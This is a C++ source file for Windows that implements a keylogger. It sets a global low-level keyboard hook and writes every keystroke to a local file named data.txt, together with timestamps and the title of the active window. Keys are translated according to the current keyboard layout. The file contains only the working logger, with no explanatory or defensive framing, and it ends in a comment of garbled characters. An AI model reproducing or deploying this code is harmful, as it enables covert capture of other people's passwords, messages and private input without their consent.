#include<Windows.h>
#include<iostream>
#include<fstream>
#include<time.h>

#pragma warning(disable:4996)
#pragma warning(disable:4703)

using namespace std;

HHOOK hook;
ofstream file;
char previousProg[256];

int Save(KBDLLHOOKSTRUCT kbData)
{
	int key = kbData.vkCode;
	if (key == 1 || key == 2) {
		return 0;
	}

	HWND foregroundW = GetForegroundWindow();

	if (foregroundW) {
		DWORD pID = GetWindowThreadProcessId(foregroundW, NULL);
		HKL kbLayout = GetKeyboardLayout(pID);
		//file << kbLayout << endl;
		char currentProg[256];
		GetWindowTextA(foregroundW, currentProg, 256);
		time_t time_ = time(NULL);
		//struct tm* tm = localtime(&time_);
		//char timestamp_buff[64];
		if (strcmp(previousProg, currentProg) != 0) {
			strcpy_s(previousProg, currentProg);
	/*		strftime(timestamp_buff, sizeof(timestamp_buff), "%c", tm);*/
			file << "[" << currentProg << "|" << time_ << "]\n";
		}

		//strftime(timestamp_buff, sizeof(timestamp_buff), "%H:%M:%S", tm);
		file << time_ << "|";

		switch (key)
		{
		case VK_BACK:
			file << "[BACKSPACE]" << endl;
			break;
		case VK_RETURN:
			file << "[ENTER]" << endl;
			break;
		case VK_SPACE:
			file << "[SPACE]" << endl;
			break;
		case VK_DELETE:
			file << "[DELETE]" << endl;
			break;
		case VK_SNAPSHOT:
			file << "[PRINTSCREEN]" << endl;
			break;
		case VK_SHIFT:
		case VK_LSHIFT:
		case VK_RSHIFT:
			file << "[SHIFT]" << endl;
			break;
		case VK_CONTROL:
		case VK_LCONTROL:
		case VK_RCONTROL:
			file << "[CTRL]" << endl;
			break;
		case VK_ESCAPE:
			file << "[ESC]" << endl;
			break;
		case VK_UP:
			file << "[UP]" << endl;
			break;
		case VK_DOWN:
			file << "[DOWN]" << endl;
			break;
		case VK_LEFT:
			file << "[LEFT]" << endl;
			break;
		case VK_RIGHT:
			file << "[RIGHT]" << endl;
			break;
		case 20:
			file << "[CAPS]" << endl;
		case 109:
		case 189:
			file << "." << endl;
			break;
		case 110:
		case 190:
			file << "-" << endl;
			break;
		default:
			unsigned char keyboardState[256];
			for (int i = 0; i < 256; ++i)
				keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
			wchar_t wbuffer; // convert virtual key to Unicode according keyboard layout
			int result = ToUnicodeEx(key, kbData.scanCode, keyboardState, &wbuffer, sizeof(wbuffer)/sizeof(wchar_t), 0, kbLayout);
			if (result > 0) {
				char buffer[4] = { 0 }; // UTF-8 max 6-bytes
				WideCharToMultiByte(CP_ACP, 0, &wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0); // Unicode to ANSI
				cout << wbuffer << " => " << buffer << endl;
				file << buffer << endl;
			}
			
			break;
		}
	}
	file.flush();
	return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT kbData = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbData);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
	file.open("data.txt");
	
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0))) {
		exit(1);
	}

	MSG msg;
	// get messages from queue
	while (GetMessage(&msg, NULL, 0, 0));
	//for (;;) {
	//	GetMessage(&msg, NULL, 0, 0);
	//}
}

// ÔË‚ÂÚgjrf Ù‚Ù‚Ùadad˚Ù‚Ù